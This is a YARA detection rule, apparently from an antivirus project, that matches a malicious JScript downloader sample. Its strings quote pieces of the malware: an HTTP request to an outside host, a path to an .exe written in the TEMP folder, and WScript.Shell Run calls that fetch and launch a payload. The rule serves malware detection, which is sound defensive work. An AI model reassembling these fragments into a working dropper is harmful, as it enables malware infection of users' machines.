rule sig_20160329_2cd82fdd65390e627196c045352205c8 {
  meta:
    description = "datamaliciousorder - file 20160329_2cd82fdd65390e627196c045352205c8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "36f92ad11c9b6c90be86d584de185c776b0632beb9e396b36bdd59c206ac79f2"

  strings:
    $s1  = "ZI[xd](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function dw() {return n0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"AYVIBAE8z.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[oL](tH() * 11); if (ZI[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var n0 = function Pm() {return WScript[Jm](\"WScript.Shell\");}(), lL = 11;" fullword ascii
    $s5  = "function g(o, Dh){a = a * 1; return o - Dh;};" fullword ascii
    $s6  = "function hM(){return \"\" + E;};" fullword ascii
    $s7  = "function Os() {return ((q == true) && (q == vS)) ? 1 : a;};" fullword ascii
    $s8  = "function H(OU){n0[\"Run\"](OU, a, a);};" fullword ascii
    $s9  = "return g(H0, Xp);" fullword ascii
    $s10 = "function n(of) {var v = (1, 2, 3, 4, 5, of); return v;};" fullword ascii
    $s11 = "function ZW()" fullword ascii
    $s12 = "function rQ(){return Jm;};" fullword ascii
    $s13 = "function tH(){return 22;};" fullword ascii
    $s14 = "var m = new this[\"Date\"]();" fullword ascii
    $s15 = " while (M){" fullword ascii
    $s16 = "vS = true; " fullword ascii
    $s17 = "var uz = false;" fullword ascii
    $s18 = "var vS = false;" fullword ascii
    $s19 = "var q = false;" fullword ascii
    $s20 = "q = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}